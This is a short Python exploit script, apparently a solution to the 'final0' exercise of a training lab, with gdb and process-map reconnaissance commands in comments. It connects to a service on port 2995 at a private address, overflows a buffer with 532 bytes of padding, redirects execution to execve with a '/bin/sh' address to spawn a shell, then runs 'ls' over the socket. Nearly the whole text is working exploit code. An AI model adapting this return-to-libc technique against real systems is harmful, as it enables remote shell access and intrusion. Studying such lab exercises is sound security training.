# gdb -p `pidof final0`
# info functions @plt
# ps -aux
# cat /proc/1778/maps

import struct
import socket

HOST = "192.168.40.128"
PORT = 2995

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

padding = "a" * 532
execve = struct.pack("I", 0x08048c0c)
ret = "bbbb"
bin_sh = struct.pack("I", 0xb7fb63bf)

payload = padding + execve + ret + bin_sh + "\x00" * 8

s.send(payload + "\n")
s.send("ls\n")
print(s.recv(1024))
